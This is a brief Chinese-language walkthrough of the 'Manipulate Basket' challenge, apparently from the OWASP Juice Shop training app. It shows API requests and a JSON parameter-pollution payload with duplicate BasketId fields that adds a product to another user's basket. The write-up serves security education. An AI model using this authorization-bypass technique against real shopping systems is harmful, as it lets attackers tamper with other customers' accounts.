- Manipulate Basket
    - 描述：将一个额外的产品放入另一个用户的购物篮中。
    - 进行添加商品到购物篮的操作
        ```POST /api/BasketItems/ HTTP/1.1```
        ```json
        {
            "ProductId": 1,
            "BasketId": "4",
            "quantity": 1
        }
        ```
        - 似乎使用 ```"BasketId":"4"``` 关联添加操作对应的购物篮
    - 修改 ```BasketId``` 字段
        得到 ```{'error' : 'Invalid BasketId'}```
    - 在购物篮增减商品时的请求
        ```PUT /api/BasketItems/9 HTTP/1.1```
        ```json
        {"quantity":0}
        ```
        在其中添加 ```BasketId``` 尝试覆盖
        ```json
        {"BasketId":4,"quantity":0}
        ```
        得到错误消息，显示通过挑战，挑战设置不恰当
    - 示例解决方案：在 ```POST``` 方法的请求中使用参数污染，提交多个 ```BasketId``` 字段
        响应成功添加商品到其他购物篮
        ```json
        {
            "ProductId": 9,
            "BasketId": "1",
            "quantity": 1,
            "BasketId": "3"
        }
        ```